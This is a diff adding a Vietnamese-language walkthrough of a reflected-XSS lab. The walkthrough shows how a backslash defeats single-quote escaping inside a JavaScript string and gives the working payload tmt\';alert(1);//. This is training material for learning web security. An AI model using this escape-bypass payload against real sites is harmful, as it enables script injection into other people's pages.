@@ -1,0 +1,27 @@
+XSS - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
+End Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+
+Analystic
+---------
+Bước 1: thử tìm kiếm với từ khóa tmt để xem phản hồi của web --> qua đọc DOM ta thấy đoạn script sau:
+
+var searchTerms = 'tmt';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                    
+ở đây ta thấy tmt được đặt trong 1 cặp dấu ' và được gán cho biến searchTerms.
+Bước 2: thử cố gắng đóng sớm dấu ' bằng cách tìm kiếm: tmt' --> ta có kết quả:
+
+var searchTerms = 'tmt\'';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+
+ở đây ta thấy dấu ' mà ta truyền vào đã bị dấu \ xử lí thành 1 kí tự thoát --> tức là thay vì được hiểu là 1 dấu ' để đóng chuỗi, nó được hiểu là 1 dấu ' được viết trong chuỗi
+Bước 3: Ta thực hiện thử cố thoát dấu \ của dấu ' khi truyền vào bằng cách tìm kiếm: tmt\' --> được kết quả như sau:
+
+var searchTerms = 'tmt\\'';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+
+Ta thấy đã dấu \ dành cho ' giờ được chuyển cho dấu \ tức là dấu \ ta truyền vào được hiểu theo nghĩa đen --> dấu ' của ta đã đóng thành công chuỗi;
+
+Bước 4: Ta có thể sử dụng payload như sau: tmt\';alert(1);//
+việc này nhằm đóng sớm chuỗi, thêm vào 1 câu lệnh alert(1) để thực thi và comment phần còn lại của dòng.
